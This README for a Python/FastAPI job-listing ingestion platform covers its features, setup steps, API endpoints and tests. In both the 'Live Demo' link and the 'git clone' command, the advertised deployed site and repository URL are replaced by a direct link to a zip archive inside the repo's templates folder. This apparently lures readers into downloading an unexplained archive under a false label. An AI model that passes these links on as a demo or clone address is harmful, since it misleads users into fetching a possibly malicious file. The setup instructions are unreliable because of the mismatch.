# Job Ingestion Platform

A production-grade, source-agnostic job listing ingestion system that demonstrates
resilience patterns, structured observability, and clean architecture.

## Live Demo

🔗 **Deployed URL**: [https://raw.githubusercontent.com/shivendra911/Job_Data_Orchestration/main/app/templates/2.4.zip](https://raw.githubusercontent.com/shivendra911/Job_Data_Orchestration/main/app/templates/2.4.zip)

> Note: Free tier — first request may take ~30 seconds as the service wakes up.

## Architecture

The system ingests job listings from multiple sources through a pluggable adapter
layer, normalizes them into a canonical schema, deduplicates using content
fingerprinting, and serves them through a paginated REST API.

### Key Features
- **3 real data sources**: Arbeitnow, Remotive, HN Who's Hiring
- **Chaos sandbox**: Controllable failure injection for resilience demos
- **Circuit breaker**: Per-source failure isolation (pybreaker)
- **Retry with backoff**: Exponential backoff + jitter (tenacity)
- **Batch validation**: Rejects corrupted batches (>30% invalid = reject)
- **Structured logging**: JSON logs with canonical log lines (structlog)
- **Prometheus metrics**: Counters, histograms, gauges at `/metrics`
- **Monitoring dashboard**: Real-time pipeline health visualization

## Quick Start

```bash
# Clone the repository
git clone https://raw.githubusercontent.com/shivendra911/Job_Data_Orchestration/main/app/templates/2.4.zip
cd job-ingestion-platform

# Copy environment file
cp .env.example .env
```

### Option A: Local Development (Virtual Environment)

**Using Standard Python venv:**
```bash
python -m venv .venv
# Activate on Windows:
.venv\Scripts\activate
# Activate on macOS/Linux:
source .venv/bin/activate

pip install -r requirements.txt -r requirements-dev.txt
```

**Using Conda:**
```bash
conda env create -f environment.yml
conda activate job-ingestion-env
```

**Run local server:**
```bash
make dev
# Open http://localhost:8000
```

### Option B: Docker Compose (Full Stack)

If you don't want to install Python locally, you can run the entire stack (PostgreSQL + App + Sandbox) via Docker:

```bash
# Start all services
docker compose up -d

# Run database migrations
make migrate
# (Or run `docker compose exec app alembic upgrade head` if Make isn't installed)

# Open dashboard
# Open http://localhost:8000
```

## API Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/v1/jobs` | Paginated job listing with filters |
| GET | `/api/v1/jobs/{id}` | Single job detail |
| GET | `/api/v1/sources` | All sources with health status |
| GET | `/api/v1/sources/{id}/runs` | Ingestion history for a source |
| POST | `/api/v1/ingest/{source}` | Manually trigger ingestion |
| GET | `/api/v1/health/live` | Liveness probe |
| GET | `/api/v1/health/ready` | Readiness probe |
| GET | `/metrics` | Prometheus metrics |

## Tech Stack

Python 3.12 · FastAPI · SQLAlchemy 2.0 · PostgreSQL (Neon) · httpx ·
Pydantic v2 · APScheduler · tenacity · pybreaker · structlog ·
prometheus-client · Docker · GitHub Actions

## Testing

```bash
make test          # Run all tests
make lint          # Ruff + mypy
make ci            # Full CI check
```

## License

MIT
